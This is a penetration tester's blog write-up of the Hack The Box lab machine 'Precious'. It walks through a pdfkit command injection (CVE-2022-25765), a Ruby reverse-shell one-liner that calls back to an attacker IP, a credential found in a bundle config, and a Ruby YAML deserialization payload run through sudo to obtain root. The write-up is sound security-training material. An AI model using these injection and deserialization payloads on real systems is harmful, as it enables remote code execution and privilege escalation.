@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB Machines // FMisi&#39;s security.log</title>
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FMisi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../stiluslapom.css" type="text/css"/>
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB Machines"/>
+<meta name="twitter:description" content=""/>
+
+    <meta property="og:title" content="HTB Machines" />
+<meta property="og:description" content="FMisi is a penetration tester." />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://fmisi.github.io/htb/" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
+      <span class="app-header-title">FMisi</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="../../index.html">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
+      </nav>
+      <p>FMisi is a penetration tester.</p>
+	  <!--a style="font-size: smaller;" href="/magyar/index.html">Switch to Hungarian</a--></br>
+      <a style="font-size: smaller;" href="../../privacy/index.html">Privacy Policy</a></br>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">HTB - Precious [Easy]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code># nmap -sC -sV -oA nmap 10.129.77.232
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre><ul>
+<li>Found domain: <code>precious.htb</code></li>
+<li>If I find a domain, I edit the /etc/hosts file with adding the entry of the IP address and domain of the target. I'm not gonna write this every time but since this is the first post, I think it's worth mentioning.</li>
+</ul>
+<h1 id="web-enum">Web Enum</h1>
+<pre tabindex="0"><code># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://precious.htb/
+nothing
+</code></pre><ul>
+<li>There is only one fuction of the site, i.e, to create pdf of a provided link.</li>
+<li>Trials and errors found that using this function to enum the site itself is not possible.</li>
+<li>Yet, when creating a pdf for our attacker controlled site reveals a version number of the dependency used to create the pdf</li>
+</ul>
+<pre tabindex="0"><code># req
+POST / HTTP/1.1
+Host: precious.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: http://precious.htb
+Connection: close
+Referer: http://precious.htb/
+Upgrade-Insecure-Requests: 1
+
+url=http://&lt;attacker-ip&gt;/
+
+# rep
+pdfkit v0.8.6
+</code></pre><h1 id="foothold-ruby">Foothold: ruby</h1>
+<ul>
+<li>Searching online reveals an exploit to this version: <code>CVE-2022-25765</code></li>
+<li>Following this link, <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a>,  and read about the poc, we can confirm that cmd injection is achievable with</li>
+</ul>
+<pre tabindex="0"><code>http://&lt;attacker-ip&gt;/?name=#{&#39;%20`curl http://&lt;attacker-ip&gt;`&#39;}
+</code></pre><ul>
+<li>We can get reverse shell using ruby</li>
+</ul>
+<pre tabindex="0"><code>http://&lt;attacker-ip&gt;/?name=#{&#39;%20`ruby -rsocket -e&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;&lt;attacker-ip&gt;&#34;,4444))&#39;`&#39;}
+</code></pre><ul>
+<li>Now, we land the target as user <code>ruby</code></li>
+</ul>
+<pre tabindex="0"><code>ruby@precious:/opt$ id
+uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
+</code></pre><h1 id="user-henry">User: henry</h1>
+<ul>
+<li>Enum on local file system found henry&rsquo;s password</li>
+</ul>
+<pre tabindex="0"><code>ruby@precious:~$ ls -la
+total 28
+drwxr-xr-x 4 ruby ruby 4096 Nov 27 16:08 .
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+drwxr-xr-x 3 ruby ruby 4096 Nov 27 16:08 .cache
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
+ruby@precious:~$ cd .bundle
+ruby@precious:~/.bundle$ ls
+config
+ruby@precious:~/.bundle$ cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: &#34;henry:Q****************H&#34;
+</code></pre><blockquote>
+<div id="password1"></div>
+<script type="text/javascript">
+    window.onload = showHidden("password1", "U2FsdGVkX1/6eSbaGQuUiwrgqaDAXxBZO6xzARdHzz9aPgDE1EqRBGaOeprxfX98",  2 );
+</script>
+
+</blockquote>
+<ul>
+<li>Login as <code>henry</code> via ssh to get the user flag</li>
+</ul>
+<h1 id="pe-root">PE: root</h1>
+<ul>
+<li>Checking sudo privileges found a command that can be run as root</li>
+</ul>
+<pre tabindex="0"><code>henry@precious:~$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre><ul>
+<li>Reading the ruby file see the following content, which references to a dependencies.yml file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#75715e"># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;yaml&#34;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;rubygems&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># TODO: update versions automatically</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_gems</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_from_file</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">YAML</span><span style="color:#f92672">.</span>load(<span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;dependencies.yml&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_local_gems</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Specification</span><span style="color:#f92672">.</span>sort_by{ <span style="color:#f92672">|</span>g<span style="color:#f92672">|</span> <span style="color:#f92672">[</span>g<span style="color:#f92672">.</span>name<span style="color:#f92672">.</span>downcase, g<span style="color:#f92672">.</span>version<span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>map{<span style="color:#f92672">|</span>g<span style="color:#f92672">|</span> <span style="color:#f92672">[</span>g<span style="color:#f92672">.</span>name, g<span style="color:#f92672">.</span>version<span style="color:#f92672">.</span>to_s<span style="color:#f92672">]</span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gems_file <span style="color:#f92672">=</span> list_from_file
+</span></span><span style="display:flex;"><span>gems_local <span style="color:#f92672">=</span> list_local_gems
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gems_file<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>file_name, file_version<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>    gems_local<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>local_name, local_version<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(file_name <span style="color:#f92672">==</span> local_name)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(file_version <span style="color:#f92672">!=</span> local_version)
+</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version differs from the one specified in file: &#34;</span> <span style="color:#f92672">+</span> local_name
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version is equals to the one specified in file: &#34;</span> <span style="color:#f92672">+</span> local_name
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><ul>
+<li>dependencies.yml</li>
+</ul>
+<pre tabindex="0"><code>henry@precious:~$ find / -type f -name dependencies.yml 2&gt;/dev/null
+/opt/sample/dependencies.yml
+henry@precious:~$ cat /opt/sample/dependencies.yml
+yaml: 0.1.1
+pdfkit: 0.8.6
+</code></pre><ul>
+<li><code>YAML.load</code> is vulnerable to ruby deserialization attacks, read this post for more detail: <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></li>
+<li>An example exploit can be found at: <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml">https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml</a></li>
+<li>Craft a <code>dependencies.yml</code> file with the following content</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Installer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#ae81ff">x</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::SpecFetcher</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#66d9ef">y</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Requirement</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">requirements</span>:
+</span></span><span style="display:flex;"><span>    !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::BufferedIO</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader::Entry</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">read</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">debug_output</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">socket</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::RequestSet</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">sets</span>: !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">socket</span>: !<span style="color:#ae81ff">ruby/module &#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">system</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">git_set</span>: <span style="color:#ae81ff">chmod +s /usr/bin/bash</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">resolve</span>
+</span></span></code></pre></div><ul>
+<li>Upload to henry&rsquo;s home directory and run the command with sudo</li>
+</ul>
+<pre tabindex="0"><code>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre><ul>
+<li>Prompting the bash with the command <code>bash -p</code> DOES NOT necessarily gives the attacker root access. It is a smarter solution to modify the yaml file again instead</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Installer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#ae81ff">x</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::SpecFetcher</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#66d9ef">y</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Requirement</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">requirements</span>:
+</span></span><span style="display:flex;"><span>    !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::BufferedIO</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader::Entry</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">read</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">debug_output</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">socket</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::RequestSet</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">sets</span>: !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">socket</span>: !<span style="color:#ae81ff">ruby/module &#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">system</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">git_set</span>: <span style="color:#ae81ff">bash -p</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">resolve</span>
+</span></span></code></pre></div><ul>
+<pre tabindex="0"><code>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+bash-5.1# cat /root/root.txt
+</code></pre></div></br>
+Done.
+</br></br>
+~Thank you for reading~
+    
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
